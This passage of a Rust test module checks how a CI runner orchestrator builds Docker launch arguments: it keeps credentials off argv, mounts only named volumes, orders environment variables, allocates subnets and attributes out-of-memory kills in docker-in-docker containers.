    /// (`docker run`) is clean, but a security review found
    /// `docker/runner/entrypoint.sh` reopening the exact hole this avoids one
    /// hop later — putting the value on `run.sh`'s own argv. `/proc/<pid>/cmdline`
    /// is world-readable on a native Linux dockerd host, so any local account
    /// could have read a runner's one-time credential and taken its job. Reads
    /// the actual shipped script rather than re-deriving its rule, so a future
    /// edit that reintroduces the argument fails this test even if nobody
    /// remembers why it matters.
    #[test]
    fn entrypoint_never_puts_the_jitconfig_value_on_argv() {
        let script = std::fs::read_to_string(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/docker/runner/entrypoint.sh"
        ))
        .expect("reading docker/runner/entrypoint.sh");

        // The flag name may still appear in a comment explaining the history;
        // it must never appear on an executable line, which is what would put
        // a value on argv.
        let carries_it_on_argv = script
            .lines()
            .any(|l| !l.trim_start().starts_with('#') && l.contains("--jitconfig"));
        assert!(
            !carries_it_on_argv,
            "a non-comment line passes --jitconfig on argv: {script}"
        );

        // The value must still actually reach run.sh — through the
        // environment, under the name the runner's own CLI parser reads as
        // --jitconfig's fallback (verified against actions/runner's source;
        // upstream's `CommandSettings`).
        assert!(
            script.contains("ACTIONS_RUNNER_INPUT_JITCONFIG=\"$RUNNER_JITCONFIG\""),
            "the JIT config must be handed to run.sh via ACTIONS_RUNNER_INPUT_JITCONFIG: {script}"
        );

        // And the old name must not ride along into the runner's own process
        // tree, where every job step would otherwise inherit it from its own
        // environment.
        assert!(
            script.contains("unset RUNNER_JITCONFIG"),
            "RUNNER_JITCONFIG must be unset before exec: {script}"
        );
    }

    /// AGENTS.md/ADR-0025 §8: the bare `RUNNER_JITCONFIG` flag is the *one*
    /// deliberate exception to "every `-e`/`--build-arg` carries a `=`".
    /// Everywhere else, a bare flag would silently forward whatever faber's own
    /// process happens to hold under that name — `docker run -e NAME` with no
    /// `=` forwards the *launcher's* environment, not a value chosen here — so a
    /// builder that forgot the `=` would be a silent info leak, not a syntax
    /// error.
    #[test]
    fn every_dash_e_and_build_arg_carries_equals_except_the_jit_flag() {
        fn assert_shape(argv: &[String], who: &str) {
            for w in argv.windows(2) {
                if w[0] == "-e" || w[0] == "--build-arg" {
                    assert!(
                        w[1] == RUNNER_JITCONFIG_ENV || w[1].contains('='),
                        "{who}: `{} {}` must carry '=' (the only exception is the bare \
                         {RUNNER_JITCONFIG_ENV})",
                        w[0],
                        w[1]
                    );
                }
            }
        }

        assert_shape(
            &dind_run_args(
                "faber-dind-1",
                "faber-net-1",
                "faber-vol-1",
                "docker:dind",
                &ResourceLimits::default(),
                &[],
            ),
            "dind_run_args",
        );

        // Every `-e`-pushing branch of runner_run_args at once: dind granted
        // (DOCKER_HOST), a custom profile env and the cache mount.
        let mut c = cfg();
        c.env.insert("EXTRA".to_string(), "value".to_string());
        assert_shape(
            &runner_run_args(
                "r",
                "n",
                Mounts {
                    cache_vol: Some("faber-cache-owner-repo"),
                    ..Default::default()
                },
                &c,
                &ResourceLimits::default(),
                &[],
            ),
            "runner_run_args",
        );

        assert_shape(
            &build_variant_args(&VariantBuild {
                recipe: b"FROM base:tag\n",
                context: Path::new("/tmp"),
                base: "base:tag",
                base_id: "sha256:aaa",
                base_user: "runner",
                version: "20.0.0",
                tag: "faber/variant:1",
            }),
            "build_variant_args",
        );
    }

    // --- the daemon grant (issue #43) --------------------------------------

    #[test]
    fn a_denied_profile_gets_no_docker_host() {
        // The grant, expressed. Without `DOCKER_HOST` the job's `docker` client
        // falls back to the local socket, which the container does not have, and
        // fails immediately with the ordinary "is the docker daemon running?"
        // instead of hanging on a connect to a host that was never started.
        let mut c = cfg();
        c.dind = DindGrant::Denied;
        let a = runner_run_args(
            "faber-runner-1",
            "faber-net-1",
            Mounts::default(),
            &c,
            &ResourceLimits::default(),
            &[],
        );
        assert!(
            !a.iter().any(|s| s.starts_with("DOCKER_HOST=")),
            "a profile granted no daemon must not be pointed at one: {a:?}"
        );
        // Everything else about the runner is unchanged — this withholds one
        // variable, it does not alter how the runner is launched.
        assert!(a.windows(2).any(|w| w == ["-e", RUNNER_JITCONFIG_ENV]));
        assert_eq!(a.last().unwrap(), "ghcr.io/owner/my-runner:latest");
        assert!(a.contains(&"-d".to_string()));
    }

    #[test]
    fn an_unstated_profile_still_gets_a_daemon() {
        // The compatibility promise, as a test: this binary reaches existing hosts
        // through an unattended update (ADR-0006), so a config written before the
        // key existed must keep working exactly as it did. Withdrawing the grant
        // on upgrade would break running CI with nobody in the loop.
        let mut c = cfg();
        c.dind = DindGrant::Unstated;
        let a = runner_run_args(
            "faber-runner-1",
            "faber-net-1",
            Mounts::default(),
            &c,
            &ResourceLimits::default(),
            &[],
        );
        assert!(a
            .windows(2)
            .any(|w| w == ["-e", "DOCKER_HOST=tcp://dind:2375"]));
    }

    #[test]
    fn only_an_explicit_denial_withholds_the_daemon() {
        // `Unstated` is a reporting distinction, never a behavioural one: exactly
        // one of the three states starts no container.
        assert!(DindGrant::Granted.granted());
        assert!(DindGrant::Unstated.granted());
        assert!(!DindGrant::Denied.granted());
        // The words are stable — the audit log and the dashboard both key on them.
        assert_eq!(DindGrant::Granted.as_str(), "granted");
        assert_eq!(DindGrant::Denied.as_str(), "denied");
        assert_eq!(DindGrant::Unstated.as_str(), "unstated");
    }

    #[test]
    fn a_config_defaults_to_an_unstated_grant() {
        // Not `Granted`: a `DockerConfig` built in code has said nothing either,
        // and collapsing the two would lose the one signal that tells an operator
        // their config predates the key.
        assert_eq!(
            DockerConfig::new("img".to_string()).dind,
            DindGrant::Unstated
        );
    }

    #[test]
    fn limits_emit_cpu_and_memory_before_the_image() {
        let limits = ResourceLimits {
            cpus: 6.0,
            memory_mib: 5120,
        };
        let a = runner_run_args("r", "n", Mounts::default(), &cfg(), &limits, &[]);
        // --cpus renders without a trailing `.0`.
        assert!(a.windows(2).any(|w| w == ["--cpus", "6"]));
        // --memory and --memory-swap are pinned equal (swap disabled).
        assert!(a.windows(2).any(|w| w == ["--memory", "5120m"]));
        assert!(a.windows(2).any(|w| w == ["--memory-swap", "5120m"]));
        // All ceilings precede the image (they are `docker run` flags).
        let img = a
            .iter()
            .position(|s| s == "ghcr.io/owner/my-runner:latest")
            .unwrap();
        let cpus = a.iter().position(|s| s == "--cpus").unwrap();
        let mem = a.iter().position(|s| s == "--memory").unwrap();
        assert!(cpus < img && mem < img);
    }

    #[test]
    fn no_cache_volume_mounts_nothing_and_exports_nothing() {
        // The default. A profile that hasn't opted in must produce byte-identical
        // argv to before the feature existed — no mount, and crucially no
        // FABER_CACHE_DIR, since a workflow keys its cache logic off that variable
        // and an unbacked value would send it looking at an ephemeral directory.
        let a = runner_run_args(
            "r",
            "n",
            Mounts::default(),
            &cfg(),
            &ResourceLimits::default(),
            &[],
        );
        assert!(
            !a.iter().any(|s| s == "-v"),
            "no volume mount without opt-in"
        );
        assert!(
            !a.iter().any(|s| s.starts_with("FABER_CACHE_DIR")),
            "the env var must be absent, not empty — it is the mount's own signal"
        );
    }

    #[test]
    fn cache_volume_mounts_outside_work_and_exports_its_path() {
        let a = runner_run_args(
            "r",
            "n",
            Mounts {
                cache_vol: Some("faber-cache-owner-repo"),
                ..Default::default()
            },
            &cfg(),
            &ResourceLimits::default(),
            &[],
        );
        assert!(a
            .windows(2)
            .any(|w| w == ["-v", "faber-cache-owner-repo:/runner/_cache"]));
        assert!(a
            .windows(2)
            .any(|w| w == ["-e", "FABER_CACHE_DIR=/runner/_cache"]));
        // The load-bearing constraint: the mount must not land on `_work`, or the
        // job workspace itself becomes shared mutable state across every job.
        assert!(
            !a.iter().any(|s| s.contains(":/runner/_work")),
            "the runner's _work tree must stay per-job — mounting it is the \
             cross-job contamination this design exists to avoid"
        );
        // Still a `docker run` flag: it has to precede the image.
        let img = a
            .iter()
            .position(|s| s == "ghcr.io/owner/my-runner:latest")
            .unwrap();
        assert!(a.iter().position(|s| s == "-v").unwrap() < img);
    }

    #[test]
    fn a_refused_launch_is_retried_without_the_mirror_only_when_one_was_mounted() {
        let refused = "docker exited exit status: 125: invalid mount config";
        assert!(retry_launch_without_mirror(true, refused));
        // No mirror: the failure is not the mirror's, and nothing is retried.
        assert!(!retry_launch_without_mirror(false, refused));
        // A timeout may have started a runner that took the JIT config: never.
        assert!(!retry_launch_without_mirror(
            true,
            "docker run -d exceeded 120s — daemon unresponsive"
        ));
    }

    #[test]
    fn a_profile_without_git_mirror_gets_no_mount_and_no_variable() {
        // ADR-0035 §8: absent is today's argv exactly.
        let a = runner_run_args(
            "r",
            "n",
            Mounts::default(),
            &cfg(),
            &ResourceLimits::default(),
            &[],
        );
        assert!(!a.iter().any(|s| s.contains("/runner/_git")));
        assert!(!a.iter().any(|s| s.starts_with("FABER_GIT_MIRROR")));
        assert!(!cfg().git_mirror, "off by default");
    }

    #[test]
    fn a_git_mirror_is_mounted_read_only_and_its_variable_wins() {
        let mut c = cfg();
        c.git_mirror = true;
        c.env
            .insert("FABER_GIT_MIRROR".to_string(), "/tmp/bogus".to_string());
        let a = runner_run_args(
            "r",
            "n",
            Mounts {
                git_mirror: Some("faber-git-owner-demo"),
                ..Default::default()
            },
            &c,
            &ResourceLimits::default(),
            &[],
        );
        assert!(a
            .windows(2)
            .any(|w| w == ["-v", "faber-git-owner-demo:/runner/_git:ro"]));
        let last = a
            .iter()
            .rposition(|s| s.starts_with("FABER_GIT_MIRROR="))
            .unwrap();
        assert_eq!(a[last], "FABER_GIT_MIRROR=/runner/_git");
        let img = a
            .iter()
            .position(|s| s == "ghcr.io/owner/my-runner:latest")
            .unwrap();
        assert!(last < img, "a `docker run` flag precedes the image");
        // Nothing else of the mirror reaches the runner: not writable, not _work.
        assert!(!a.iter().any(|s| s.ends_with(":/runner/_git")));
        assert!(!a.iter().any(|s| s.contains(":/runner/_work")));
    }

    #[test]
    fn a_runner_without_the_mirror_gets_no_mirror_variable() {
        let mut c = cfg();
        assert!(!c.mirror, "off by default");
        c.mirror = true;
        // Opted in but not connected (mirror off, down, or the connect failed):
        // nothing names a mirror the job cannot reach.
        let a = runner_run_args(
            "r",
            "n",
            Mounts::default(),
            &c,
            &ResourceLimits::default(),
            &[],
        );
        assert!(!a.iter().any(|s| s.starts_with("FABER_MIRROR")));
    }

    #[test]
    fn the_mirror_variables_follow_the_profile_env_so_faber_wins() {
        let mut c = cfg();
        c.mirror = true;
        c.env
            .insert("FABER_MIRROR".to_string(), "http://bogus".to_string());
        let inj = crate::mirror::plan(
            true,
            &crate::mirror::Condition::Healthy,
            "owner/demo",
            None,
            &c.env,
            &[],
        )
        .unwrap();
        let a = runner_run_args(
            "r",
            "n",
            Mounts {
                mirror_env: &inj.env,
                ..Default::default()
            },
            &c,
            &ResourceLimits::default(),
            &[],
        );
        let last = a
            .iter()
            .rposition(|s| s.starts_with("FABER_MIRROR="))
            .unwrap();
        assert_eq!(a[last], "FABER_MIRROR=http://faber-mirror:7470");
        assert_eq!(a[last - 1], "-e");
        let img = a
            .iter()
            .position(|s| s == "ghcr.io/owner/my-runner:latest")
            .unwrap();
        assert!(last < img, "a `docker run` flag precedes the image");
        // The mirror is reached by alias on the job's own network, never by a
        // second network on the runner.
        assert_eq!(a.iter().filter(|s| *s == "--network").count(), 1);
    }

    #[test]
    fn the_mirror_token_reaches_the_runner_only_through_the_child_environment() {
        // ADR-0047 §4: the per-container token travels inside `lfs.url`. The
        // LFS redirect is secret: its names go on the argv, its values only into
        // the launch child's environment, as the JIT config and a service's
        // DATABASE_URL do.
        let token = "t0ken-never-on-argv";
        let mut c = cfg();
        c.mirror = true;
        // A profile that sets its own git config entry: faber appends to it.
        c.env.insert("GIT_CONFIG_COUNT".into(), "1".into());
        c.env
            .insert("GIT_CONFIG_KEY_0".into(), "core.longpaths".into());
        c.env.insert("GIT_CONFIG_VALUE_0".into(), "true".into());
        let inj = crate::mirror::plan(
            true,
            &crate::mirror::Condition::Healthy,
            "owner/demo",
            Some(crate::mirror::RepoToken::new(token.into())),
            &c.env,
            crate::mirror::ECOSYSTEMS,
        )
        .unwrap();
        let names = inj.secret_env.names();
        let marks = runner_marks("owner/demo", "1-2", &ClaimMarks::default());
        let a = runner_run_args(
            "r",
            "n",
            Mounts {
                mirror_env: &inj.env,
                mirror_secret_env: &names,
                ..Default::default()
            },
            &c,
            &ResourceLimits::default(),
            &marks,
        );
        assert!(
            a.iter().all(|s| !s.contains(token)),
            "the token is on the argv: {a:?}"
        );
        assert!(a.windows(2).any(|w| w == ["-e", "GIT_CONFIG_VALUE_1"]));
        // faber's count follows the profile's on the argv, so Docker keeps it.
        let profile = a.iter().position(|s| s == "GIT_CONFIG_COUNT=1").unwrap();
        let faber = a.iter().rposition(|s| s == "GIT_CONFIG_COUNT").unwrap();
        assert!(profile < faber, "{a:?}");
        assert!(a.iter().any(|s| s == "GIT_CONFIG_KEY_0=core.longpaths"));
        let none = crate::services::Attached::none();
        let mut child = none.env();
        child.extend(inj.secret_env.pairs());
        let env = launch_env("JITBLOB", child);
        assert!(env.contains(&(
            "GIT_CONFIG_VALUE_1",
            "http://faber-mirror:7470/lfs/t0ken-never-on-argv/owner/demo/info/lfs"
        )));
        assert!(env.contains(&("GIT_CONFIG_COUNT", "3")));
        assert!(env.contains(&(
            "GIT_CONFIG_VALUE_2",
            "https://github.com/owner/demo.git/info/lfs"
        )));
        // The JIT config stays last, so nothing a redirect sets can shadow it.
        assert_eq!(env.last(), Some(&(RUNNER_JITCONFIG_ENV, "JITBLOB")));
    }

    #[test]
    fn cache_dir_env_wins_over_a_profile_that_sets_it_by_hand() {
        // Docker resolves a repeated `-e KEY=` to the last one, so faber's value
        // must be pushed after `cfg.env`. Otherwise a profile could point a
        // workflow at a path with no volume behind it.
        let mut c = cfg();
        c.env
            .insert("FABER_CACHE_DIR".to_string(), "/tmp/bogus".to_string());
        let a = runner_run_args(
            "r",
            "n",
            Mounts {
                cache_vol: Some("faber-cache-owner-repo"),
                ..Default::default()
            },
            &c,
            &ResourceLimits::default(),
            &[],
        );
        let last = a
            .iter()
            .rposition(|s| s.starts_with("FABER_CACHE_DIR="))
            .unwrap();
        assert_eq!(a[last], "FABER_CACHE_DIR=/runner/_cache");
    }

    #[test]
    fn cache_volume_name_is_per_repo_and_docker_legal() {
        assert_eq!(cache_volume_name("owner/demo"), "faber-cache-owner-demo");
        // Two repos never share a volume — the isolation the per-repo scoping buys.
        assert_ne!(
            cache_volume_name("owner/a"),
            cache_volume_name("owner/b"),
            "each repo gets its own cache"
        );
        // Docker volume names are [a-zA-Z0-9][a-zA-Z0-9_.-]*; `.`/`_`/`-` survive,
        // anything else folds to `-`, and the result is lowercased.
        assert_eq!(
            cache_volume_name("My-Org/some.repo_v2"),
            "faber-cache-my-org-some.repo_v2"
        );
        for name in [
            cache_volume_name("owner/demo"),
            cache_volume_name("My-Org/some.repo_v2"),
            cache_volume_name("weird/re po!"),
        ] {
            assert!(
                name.chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-'),
                "{name} must be a legal docker volume name"
            );
        }
    }

    // --- credential volumes ------------------------------------------------

    /// A placeholder, never a credential. Distinctive enough that a substring
    /// search for it cannot match anything else the argv legitimately contains.
    const FAKE_SECRET: &str = "PLACEHOLDER-NOT-A-CREDENTIAL-7f3a1c";

    /// A credential fill, for the tests below: the shape [`crate::git_mirror`]
    /// and [`crate::mirror`] use, with a placeholder volume.
    fn test_fill<'a>(labels: &'a [String]) -> CredentialFill<'a> {
        CredentialFill {
            volume: "faber-git-auth-1-1",
            labels,
            container: "faber-git-auth-fill-1-1",
            image: "ghcr.io/owner/my-runner:latest",
            dir: "/faber/credential",
            file: "credentials",
            owner: Some("runner"),
        }
    }

    /// Every `-v` source in `argv`. A named volume is `[A-Za-z0-9][A-Za-z0-9_.-]*`;
    /// a host path starts with `/` (or `.`/`~`), which the daemon would resolve
    /// inside faber's VM, where no host folder is shared (ADR-0026).
    fn mount_sources(argv: &[String]) -> Vec<String> {
        argv.windows(2)
            .filter(|w| w[0] == "-v" || w[0] == "--volume" || w[0] == "--mount")
            .map(|w| w[1].split(':').next().unwrap_or_default().to_string())
            .collect()
    }

    fn is_named_volume(src: &str) -> bool {
        let b = src.as_bytes();
        !b.is_empty()
            && b[0].is_ascii_alphanumeric()
            && b.iter()
                .all(|&c| c.is_ascii_alphanumeric() || matches!(c, b'_' | b'.' | b'-'))
    }

    #[test]
    fn no_runner_or_fill_argv_mounts_a_host_path() {
        // faber's Docker shares no host folder (ADR-0026): a host path on `-v` is
        // an empty directory inside the VM, and the job silently loses whatever
        // faber meant to hand it. Every mount the runner, dind and the credential
        // fill take must be a named volume.
        let mut c = cfg();
        c.dind = DindGrant::Granted;
        let runner = runner_run_args(
            "r",
            "n",
            Mounts {
                cache_vol: Some("faber-cache-owner-demo"),
                git_mirror: Some("faber-git-owner-demo"),
                ..Default::default()
            },
            &c,
            &ResourceLimits::default(),
            &[],
        );
        let dind = dind_run_args(
            "faber-dind-1",
            "faber-net-1",
            "faber-vol-1",
            "docker:dind",
            &ResourceLimits::default(),
            &[],
        );
        let labels = marks(KIND_GIT_AUTH, "owner/demo", "1-1");
        let fill = credential_fill_args(&test_fill(&labels));
        for (what, argv, n) in [
            ("runner", &runner, 2),
            ("dind", &dind, 1),
            ("fill", &fill, 1),
        ] {
            let sources = mount_sources(argv);
            assert_eq!(sources.len(), n, "{what}: {sources:?}");
            for src in sources {
                assert!(is_named_volume(&src), "{what} mounts host path {src:?}");
            }
        }
    }

    #[test]
    fn a_credential_fill_carries_the_secret_on_stdin_only() {
        // The fill's child is built from a struct that cannot hold the secret, and
        // its whole argv and environment are checked anyway: the secret reaches
        // it only as the bytes `CredentialVolume::fill` writes to its stdin.
        let labels = marks(KIND_GIT_AUTH, "owner/demo", "1-1");
        let f = test_fill(&labels);
        let cmd = credential_fill_command(&f);
        let std = cmd.as_std();
        for arg in std.get_args() {
            let arg = arg.to_string_lossy();
            assert!(!arg.contains(FAKE_SECRET));
        }
        for (k, v) in std.get_envs() {
            let v = v
                .map(|v| v.to_string_lossy().into_owned())
                .unwrap_or_default();
            assert!(!v.contains(FAKE_SECRET), "{k:?} carries the secret");
        }

        let a = credential_fill_args(&f);
        // stdin attached, offline, never a pull, as root so it can write the
        // fresh volume and hand the file to the runner's user.
        for flag in ["-i", "--pull=never"] {
            assert!(a.iter().any(|s| s == flag), "{flag}");
        }
        // #348: not `--rm`, which makes the CLI wait out the removal too, so a
        // fill that had written its file timed out behind a slow delete.
        assert!(!a.iter().any(|s| s == "--rm"));
        assert!(a.windows(2).any(|w| w == ["--network", "none"]));
        assert!(a.windows(2).any(|w| w == ["--user", "0:0"]));
        assert!(a
            .windows(2)
            .any(|w| w == ["-v", "faber-git-auth-1-1:/faber/credential"]));
        assert!(!a.iter().any(|s| s == "-e"), "no variable carries anything");
        // Labelled with the volume's own marks, so its provenance is a fact.
        assert!(a.contains(&format!("{LABEL_KIND}={KIND_GIT_AUTH}")));
        // The script is the constant; the path, file and owner follow it as data.
        let script = a.iter().position(|s| s == CREDENTIAL_FILL_SCRIPT).unwrap();
        assert_eq!(
            &a[script + 1..],
            ["sh", "/faber/credential", "credentials", "runner"]
        );
        // `0600` from creation in a `0700` directory, as the host file was.
        assert!(CREDENTIAL_FILL_SCRIPT.contains("umask 077"));
        assert!(CREDENTIAL_FILL_SCRIPT.contains("chmod 0700 \"$1\""));
    }

    #[test]
    fn an_unconfigured_registry_changes_no_argv_at_all() {
        // Fail-open, the loudest requirement: without credentials the launch must
        // be byte-identical to what faber emitted before this existed.
        let a = runner_run_args(
            "r",
            "n",
            Mounts::default(),
            &cfg(),
            &ResourceLimits::default(),
            &[],
        );
        assert!(!a.iter().any(|s| s.contains("DOCKER_CONFIG")));
        assert!(!a.iter().any(|s| s == "-v"), "nothing is mounted");
        // And the policy is off unless an operator turns it on.
        assert!(!RegistryAuth::default().enabled);
    }

    /// A host with no declared pool must build exactly the argv it always did —
    /// the whole "absent key changes nothing" contract, checked rather than
    /// asserted, because this one reaches follower hosts unattended (ADR-0006).
    #[test]
    fn no_declared_pool_leaves_allocation_to_docker() {
        let m = marks("net", "owner/demo", "42-1700");
        let args = network_create_args("faber-net-42-1700", &m, None);
        assert!(!args.iter().any(|a| a == "--subnet"));
        assert_eq!(args[0], "network");
        assert_eq!(args[1], "create");
        assert_eq!(args.last().map(String::as_str), Some("faber-net-42-1700"));
    }

    /// With a pool, the subnet is pinned — and still ahead of the name, which is
    /// what `docker network create` requires of every flag.
    #[test]
    fn a_declared_pool_pins_the_subnet() {
        let m = marks("net", "owner/demo", "42-1700");
        let args = network_create_args("faber-net-42-1700", &m, Some("10.63.3.0/24"));
        let i = args
            .iter()
            .position(|a| a == "--subnet")
            .expect("subnet flag present");
        assert_eq!(args[i + 1], "10.63.3.0/24");
        assert_eq!(args.last().map(String::as_str), Some("faber-net-42-1700"));
        // The marks survive the new flag.
        assert!(args.iter().any(|a| a == "org.faber.owned=true"));
    }

    /// The failure this whole path exists for: faber must pick a subnet that
    /// dodges what other tools already hold, not merely one inside its pool.
    #[test]
    fn allocation_avoids_the_subnets_other_tools_hold() {
        use crate::netpool::{offset_for, parse_subnets, NetPool};
        // Stand-in for a host whose default pools are held by foreign compose
        // stacks, plus a stray block that overlaps the start of faber's own pool.
        let taken = parse_subnets(["172.17.0.0/16", "192.168.0.0/20", "10.63.0.0/22"]);
        let pool = NetPool::declare("10.63.0.0/16", 24).expect("valid pool");
        let got = pool
            .allocate(&taken, offset_for("faber-net-42-1700") % pool.slots())
            .expect("a free subnet exists");
        assert!(
            !taken.iter().any(|t| t.overlaps(&got)),
            "{got} overlaps something already bridged"
        );
        assert_eq!(got.prefix(), 24);
    }

    /// Every resource faber creates must be able to say so itself. Ownership was
    /// a naming convention, which cannot distinguish faber's `faber-dind-…` from
    /// an unrelated compose project's `myproj-faber-dind-1`, and says nothing
    /// about who may delete it — the question that matters now faber reclaims
    /// disk on its own (ADR-0007).
    #[test]
    fn every_created_resource_carries_its_ownership_marks() {
        let m = marks("dind", "owner/demo", "42-1700");
        let pairs: Vec<(&String, &String)> = m.chunks(2).map(|c| (&c[0], &c[1])).collect();
        assert!(pairs.iter().all(|(flag, _)| *flag == "--label"));
        let kv: Vec<&str> = pairs.iter().map(|(_, v)| v.as_str()).collect();
        assert!(kv.contains(&"org.faber.owned=true"));
        assert!(kv.contains(&"org.faber.kind=dind"));
        assert!(kv.contains(&"org.faber.repo=owner/demo"));
        assert!(kv.contains(&"org.faber.id=42-1700"));

        // …and each creation path actually carries them.
        let limits = ResourceLimits::default();
        let net = network_create_args("faber-net-42-1700", &m, None);
        let vol = volume_create_args("faber-vol-42-1700", &m);
        let dind = dind_run_args("d", "n", "v", "docker:dind", &limits, &m);
        let runner = runner_run_args("r", "n", Mounts::default(), &cfg(), &limits, &m);
        for (what, args) in [
            ("network", &net),
            ("volume", &vol),
            ("dind", &dind),
            ("runner", &runner),
        ] {
            assert!(
                args.windows(2)
                    .any(|w| w[0] == "--label" && w[1] == "org.faber.owned=true"),
                "{what} is created without an ownership mark"
            );
        }

        // The name each resource is created under must still be the last word —
        // a label appended after it would be read as the resource name.
        assert_eq!(net.last().map(String::as_str), Some("faber-net-42-1700"));
        assert_eq!(vol.last().map(String::as_str), Some("faber-vol-42-1700"));
    }

    #[test]
    fn dind_limits_precede_image_and_dockerd_args_follow() {
        let limits = ResourceLimits {
            cpus: 4.0,
            memory_mib: 1024,
        };
        let a = dind_run_args("d", "n", "v", "docker:dind", &limits, &[]);
        let img = a.iter().position(|s| s == "docker:dind").unwrap();
        let mem = a.iter().position(|s| s == "--memory").unwrap();
        // Ceiling flags before the image; the dockerd `--tls=false` stays last.
        assert!(mem < img);
        assert_eq!(a.last().unwrap(), "--tls=false");
    }

    #[test]
    fn a_stats_reading_carries_memory_and_io_from_one_line() {
        assert_eq!(
            parse_stats_reading(
                r#"{"Mem":"512MiB / 16GiB","Block":"1.2MB / 3.4kB","Net":"5.6kB / 789B"}"#
            ),
            StatsReading {
                mem_mib: Some(512),
                io: Some(IoBytes {
                    block_read: 1_200_000,
                    block_written: 3_400,
                    net_received: 5_600,
                    net_sent: 789,
                }),
            }
        );
        // An I/O column Docker has nothing for yet costs only the I/O.
        assert_eq!(
            parse_stats_reading(r#"{"Mem":"512MiB / 16GiB","Block":"--","Net":"--"}"#),
            StatsReading {
                mem_mib: Some(512),
                io: None,
            }
        );
        // An unreadable memory column costs only the memory.
        let r = parse_stats_reading(r#"{"Mem":"garbage","Block":"1B / 2B","Net":"3B / 4B"}"#);
        assert_eq!(r.mem_mib, None);
        assert!(r.io.is_some());
        // A daemon that knows no I/O columns at all still yields the memory.
        assert_eq!(
            parse_stats_reading(r#"{"Mem":"1GiB / 2GiB"}"#).mem_mib,
            Some(1024)
        );
        // A value carrying a tab or a quote stays inside its own column.
        let forged = parse_stats_reading(
            r#"{"Mem":"1MiB / 2GiB\t9B / 9B","Block":"1B / 2B\"","Net":"3B / 4B"}"#,
        );
        assert_eq!(forged.mem_mib, Some(1));
        assert_eq!(forged.io, None);
        // Not JSON at all reads as nothing.
        assert_eq!(
            parse_stats_reading("512MiB / 1GiB\t1B / 1B\t1B / 1B"),
            StatsReading::default()
        );
    }

    #[test]
    fn parse_mem_usage_reads_the_used_side_across_units() {
        assert_eq!(parse_mem_usage_mib("1.5GiB / 20GiB"), Some(1536));
        assert_eq!(parse_mem_usage_mib("512MiB / 16GiB"), Some(512));
        assert_eq!(parse_mem_usage_mib("2GB / 20GB"), Some(2048));
        // A container with no reading yet, or an empty field, is not a zero peak.
        assert_eq!(parse_mem_usage_mib("-- / --"), None);
        assert_eq!(parse_mem_usage_mib(""), None);
        assert_eq!(parse_mem_usage_mib("garbage"), None);
    }

    // --- dind OOM attribution ----------------------------------------------
    //
    // The fixtures below have the shape of `cat /sys/fs/cgroup/memory.events.local`
    // on a cgroup v2 container pinned with the same `--memory`/`--memory-swap`
    // faber applies. Each names the event that produced it.

    /// A dind whose *nested* container was OOM-killed against its own 32m limit.
    /// The dind itself never approached its 512m ceiling. Its hierarchical
    /// `memory.events` read `max 20 oom 1 oom_kill 1` for this same moment, and
    /// `docker inspect` reported `OOMKilled=true` — while the container was still
    /// running. This is the shape of the production false positive.
    const NESTED_CONTAINER_OOM: &str =
        "low 0\nhigh 0\nmax 0\noom 0\noom_kill 0\noom_group_kill 0\n";

    /// A dind that breached **its own** 512m ceiling. `oom_kill` is 0 even here:
    /// the victim lived in the `/init` child cgroup that `docker:dind` moves its
    /// daemons into, so only `oom` marks the cgroup whose limit actually broke.
    const DIND_OWN_OOM: &str = "low 0\nhigh 0\nmax 40\noom 1\noom_kill 0\noom_group_kill 0\n";

    /// A flat container — no child cgroups, processes at its own root, i.e. the
    /// runner container's shape — that OOM-killed one of its own processes. Both
    /// fields fire, which is why the tally sums them.
    const FLAT_CONTAINER_OOM: &str = "low 0\nhigh 0\nmax 40\noom 1\noom_kill 1\noom_group_kill 0\n";

    /// The bug, at the level the fix lives: a nested container's OOM must not read
    /// as the dind's own, and the dind's own must.
    #[test]
    fn a_nested_containers_oom_is_not_the_dinds_own() {
        assert_eq!(
            parse_local_oom(NESTED_CONTAINER_OOM),
            Some(0),
            "a nested container dying against its own limit leaves dind's own \
             counters untouched — this is the run that used to force-bump the cap"
        );
        assert!(!dind_oom_verdict(
            "dind",
            parse_local_oom(NESTED_CONTAINER_OOM),
            None
        ));

        assert_eq!(
            parse_local_oom(DIND_OWN_OOM),
            Some(1),
            "dind breaching its own ceiling must still be seen"
        );
        assert!(dind_oom_verdict(
            "dind",
            parse_local_oom(DIND_OWN_OOM),
            None
        ));
    }

    /// `oom_kill` alone would have read as "no OOM" on the very event it is meant
    /// to catch, because dind's own processes sit in a child cgroup. Summing it
    /// with `oom` keeps a flat container (the runner's layout) covered too.
    #[test]
    fn the_tally_catches_both_ends_of_an_oom() {
        assert!(
            DIND_OWN_OOM.contains("oom_kill 0"),
            "the fixture must be the awkward case, or this proves nothing"
        );
        assert_eq!(parse_local_oom(DIND_OWN_OOM), Some(1));
        // Flat layout: the limit that broke and the process that died are the same
        // cgroup, so both fields count the one event. Only `> 0` is ever asked.
        assert_eq!(parse_local_oom(FLAT_CONTAINER_OOM), Some(2));
        assert!(dind_oom_verdict(
            "dind",
            parse_local_oom(FLAT_CONTAINER_OOM),
            None
        ));
    }

    /// "Couldn't read it" must stay distinguishable from "read it, it was zero" —
    /// collapsing the two is what would make a silent regression look like a fix.
    #[test]
    fn an_unreadable_counter_is_not_a_zero_reading() {
        // What a post-mortem read actually produces: the container is gone, the
        // cgroup with it, and docker answers on stderr with an empty stdout.
        assert_eq!(parse_local_oom(""), None);
        assert_eq!(
            parse_local_oom("Error response from daemon: container abc is not running"),
            None
        );
        // cgroup v1, or any kernel without the file: nothing named `oom` at all.
        assert_eq!(parse_local_oom("some_other_stat 0\n"), None);
        // Present but unparsable counts are not silently read as zero either.
        assert_eq!(parse_local_oom("oom nonsense\n"), None);

        // And the verdict fails *closed* on that, rather than falling back to the
        // hierarchical flag that caused the ratchet.
        assert!(!dind_oom_verdict("dind", None, None));
        assert!(!dind_oom_verdict("dind", parse_local_oom(""), None));
    }

    /// The one case the local counter structurally cannot answer: dind is the
    /// victim, so the cgroup holding the counter dies with it. Failing closed here
    /// is what let a 256 MiB dind, OOM-killed part-way through an e2e stack's
    /// concurrent image pull, be read as a registry flake for days — the job sees
    /// a truncated transfer and then a host that no longer resolves, and faber
    /// recorded no OOM at all.
    #[test]
    fn a_dind_that_died_of_its_own_oom_is_recorded_even_with_no_counter() {
        assert!(dind_oom_verdict("dind", None, Some(true)));
        // Still closed on the two answers that are not "its own ceiling killed it".
        assert!(!dind_oom_verdict("dind", None, Some(false)));
